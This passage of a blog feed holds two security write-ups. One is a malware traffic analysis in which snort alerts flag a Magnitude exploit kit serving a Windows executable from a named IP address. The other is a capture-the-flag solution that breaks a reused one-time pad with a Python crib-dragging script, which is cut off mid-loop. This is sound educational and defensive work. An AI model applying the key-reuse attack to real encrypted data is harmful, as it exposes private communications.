  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r&lt;/code&gt; : to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--daq pcap&lt;/code&gt; : to select packet acquisition module.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;The command is as below:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; traffic.pcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;05/07-20:51:37.788434  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:98] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49185 -&amp;gt; 62.75.195.236:80
05/07-20:51:37.788434  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2020895:5] ET CURRENT_EVENTS Magnitude Flash Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; M2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49185 -&amp;gt; 62.75.195.236:80
05/07-20:51:39.132903  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021054:1] ET CURRENT_EVENTS Magnitude EK Flash Payload ShellCode Apr 23 2015 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49188
05/07-20:51:39.272670  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49189 -&amp;gt; 62.75.195.236:80
05/07-20:51:39.414407  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2000419:18] ET POLICY PE EXE or DLL Windows file download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49189
05/07-20:51:39.414407  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021076:1] ET INFO SUSPICIOUS Dotted Quad Host MZ Response &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49189
05/07-20:51:39.414407  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2009897:7] ET MALWARE Possible Windows executable sent when remote host claims to send html content &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49189
05/07-20:51:41.438424  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49190 -&amp;gt; 62.75.195.236:80
05/07-20:51:41.749079  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49191 -&amp;gt; 62.75.195.236:80
05/07-20:51:42.059997  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49192 -&amp;gt; 62.75.195.236:80
05/07-20:51:42.593075  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49193 -&amp;gt; 62.75.195.236:80
05/07-20:51:42.894386  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49194 -&amp;gt; 62.75.195.236:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The outputs indicates that the traffic triggers multiple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; rules related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magnitude EK&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Same results for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Squert&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpreplay &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 traffic.pcap
sending out eth0 
processing file: traffic.pcap
Actual: 761 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;495665 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.03 seconds.                Rated: 16522167.0 bps, 126.05 Mbps, 25366.67 pps
Statistics &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;network device: eth0
        Attempted packets:         761
        Successful packets:        761
        Failed packets:            0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ENOBUFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EAGAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:  0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/squert.png&quot; title=&quot;magnitude_ek/squert.png&quot; alt=&quot;magnitude_ek/squert.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;virustotal&quot;&gt;&lt;strong&gt;VirusTotal&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Now, we extract the malware and submit it onto &lt;strong&gt;Virus Total&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To extract the malware, from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we navigate to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;File -&amp;gt; Export Objects -&amp;gt; HTTP&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/malware_extract.png&quot; title=&quot;magnitude_ek/malware_extract.png&quot; alt=&quot;magnitude_ek/malware_extract.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Save the &lt;strong&gt;packet #426&lt;/strong&gt; due to the large size.&lt;/p&gt;

&lt;p&gt;Let’s us then pass it to &lt;strong&gt;Virus Total&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/virustotal.png&quot; title=&quot;magnitude_ek/virustotal.png&quot; alt=&quot;magnitude_ek/virustotal.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware&lt;/code&gt; is lighting up as a Christmas tree!.&lt;/p&gt;

&lt;p&gt;Analyzing &lt;strong&gt;packet #426&lt;/strong&gt;, it’s also a &lt;strong&gt;MS Windows executable&lt;/strong&gt; regardless of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/packet426.png&quot; title=&quot;magnitude_ek/packet426.png&quot; alt=&quot;magnitude_ek/packet426.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;From the analyses, we can safely conclude that the user is infected by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magnitude EK&lt;/code&gt;, which exploits the vulnerable &lt;strong&gt;Adobe Flash&lt;/strong&gt; and installs ransomeware on the contaminated system.&lt;/p&gt;</content><author><name></name></author><category term="snort" /><category term="traffic_analysis" /><category term="ek" /><summary type="html">Description You have a pcap, and you need to figure out what’s going on. What’s happening here? Download the .pcap here. (The password is: infected).</summary></entry><entry><title type="html">N1TP - H@acktivityCon 2021</title><link href="https://jayngng.github.io/blog/n1tp-hacktivitycon-2021/" rel="alternate" type="text/html" title="N1TP - H@acktivityCon 2021" /><published>2021-09-18T18:37:02+10:00</published><updated>2021-09-18T18:37:02+10:00</updated><id>https://jayngng.github.io/blog/n1tp---hacktivitycon-2021</id><content type="html" xml:base="https://jayngng.github.io/blog/n1tp-hacktivitycon-2021/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @JohnHammond#6971&lt;/p&gt;

&lt;p&gt;Nina found some new encryption scheme that she apparently thinks is really cool. She’s annoying but she found a flag or something, can you deal with her?&lt;/p&gt;

&lt;p&gt;Press the Start button on the top-right to begin this challenge.
Connect with:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc challenge.ctf.games 31921
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s us connect to the challenge.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 31921
NINA: Hello! I found a flag, look!
      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
NINA: But I encrypted it with a very special nonce, the same length as 
      the flag! I heard people say this encryption method is unbreakable!
      I&lt;span class=&quot;s1&quot;&gt;&apos;ll even let you encrypt something to prove it!! What should we encrypt?
&amp;gt; Hello NINAAA
NINA: Ta-daaa!! I think this is called a &apos;&lt;/span&gt;one&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;pad&lt;span class=&quot;s1&quot;&gt;&apos; or something?
      5d599ac45acaa3ed7eaf0ffe69c37e566ed44a19cf4c0ae43d5ec50d609b3ac513231bd9c8f2
NINA: Isn&apos;&lt;/span&gt;t that cool!?! Want to see it again? 
      Sorry, I forget already &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; what was it you wanted to see again?
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; THIS IS ME ...
NINA: Ta-daaa!! I think this is called a &lt;span class=&quot;s1&quot;&gt;&apos;one&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;time&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;pad&apos;&lt;/span&gt; or something?
      4174bffb15a3be847dab6e910f88467248a72419d22d06e05515874f5bf33ddf7d2b09b8cdd2
NINA: Isn&lt;span class=&quot;s1&quot;&gt;&apos;t that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
&amp;gt; HOW ARE YOU DOING
NINA: Ta-daaa!! I think this is called a &apos;&lt;/span&gt;one&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;pad&lt;span class=&quot;s1&quot;&gt;&apos; or something?
      5d73a18874b8a88469a11b9f65e95b7446bc4b07a14c19e05562e6342fff3bc5132512d7d7b7
NINA: Isn&apos;&lt;/span&gt;t that cool!?! Want to see it again? 
      Sorry, I forget already &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; what was it you wanted to see again?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the very first line, Nina sent us a encrypted flag using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;one&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;time&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pad&lt;/code&gt;. Now everytime we sent a message, Nina takes our message, encrypts it and sends it back to us.&lt;/p&gt;

&lt;p&gt;Our theory is Nina reuses a same key for message encryption. This is also called &lt;strong&gt;Many Time Pad Attack&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Source: &lt;a href=&quot;http://travisdazell.blogspot.com/2012/11/many-time-pad-attack-crib-drag.html&quot;&gt;Many Time Pad Attack.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;To attack the encryption, we follow the below steps:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Guess a word that might appear in one of the messages&lt;/li&gt;
  &lt;li&gt;Encode the word from step 1 to a hex string&lt;/li&gt;
  &lt;li&gt;XOR the two cipher-text messages&lt;/li&gt;
  &lt;li&gt;XOR the hex string from step 2 at each position of the XOR of the two cipher-texts (from step 3)&lt;/li&gt;
  &lt;li&gt;When the result from step 4 is readable text, we guess the English word and expand our crib search.
     + If the result is not readable text, we try an XOR of the crib word at the next position.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; script can automatically do the job. (I couldn’t remember where the source is).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python &lt;/span&gt;
import string
import collections
import sets

&lt;span class=&quot;c&quot;&gt;# XORs two string&lt;/span&gt;
def strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a, b&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:     &lt;span class=&quot;c&quot;&gt;# xor two strings (trims the longer input)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;chr&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ord&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ^ ord&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x, y&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;zip&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a, b&lt;span class=&quot;o&quot;&gt;)])&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 10 unknown ciphertexts (in hex format), all encrpyted with the same key&lt;/span&gt;
c1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1a3a20741ca737cb76cb0e33909bb16bc0dd5cd150c14babcf505f6473b6615f8bd0963a04c4&quot;&lt;/span&gt;
c2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;23343e651ca7308a718e0260d981fe7e87df5ad06b8044abcf455c2820bd6d118384c63710852a3238651cb5348a62&quot;&lt;/span&gt;
c3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3a332b7259f3319825c312339f83f06d87d515de6a8052be8650592a67f362109084df2f43cb24352f204cbf2bcb62c71d76d982f42aded340cd27c649be880459646eb6611bc2cdc27b17ca6d283b6251ba2ccb63c11933918ef261d3d543d664cf4b&quot;&lt;/span&gt;
c4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;34343b204fbb379e69ca4b7d969bb178c2c946da27d44dbacf4f553d20b56b0dc2cbd83e43d124362b204cb23ccb6bc70572&quot;&lt;/span&gt;
c5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;272e3d741cb4319d608e0676d99bf96f87da59de60ca50ac9b04572d76b624128784c2330685&quot;&lt;/span&gt;
c6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;247b396152a7788a25c807729e86b17dc6d2419f668043b38e43596477b26a0bc2c5963d0fc4&quot;&lt;/span&gt;
c7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;25352b7755b22d8d6bcc0f60958efb61d0d95ed561ce41ac84485e2573a97c1c9adede3506d2&quot;&lt;/span&gt;
c8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;247b2f6d1ca4398271c70574d989fe7887c85dda27c649be884d10256df3731e8bd0df350485&quot;&lt;/span&gt;
c9 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3a332f741ca4399825c71f338080e42ad0dd5bcb62c405ab8004432165f3651883cdd82c0bc4&quot;&lt;/span&gt;
c10 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;047b286f4eb43d9f25cf07619c8ef573ee9c53d075c740abcf455c3665b26006ab84d03411c2&quot;&lt;/span&gt;


ciphers &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c1, c2, c3, c4, c5, c6, c7, c8, c9, c10]
&lt;span class=&quot;c&quot;&gt;# The target ciphertext we want to crack&lt;/span&gt;
target_cipher &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;2b372f6747ea6adc33cd0f71ced9f039c3d803dd36c610eddc16007d63b73d1cd2c5876a01d8&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# To store the final key&lt;/span&gt;
final_key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;150
&lt;span class=&quot;c&quot;&gt;# To store the positions we know are broken&lt;/span&gt;
known_key_positions &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# For each ciphertext&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;current_index, ciphertext &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

	counter &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; collections.Counter&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;# for each other ciphertext&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;index, ciphertext2 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
		&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;current_index &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; index: &lt;span class=&quot;c&quot;&gt;# don&apos;t xor a ciphertext with itself&lt;/span&gt;
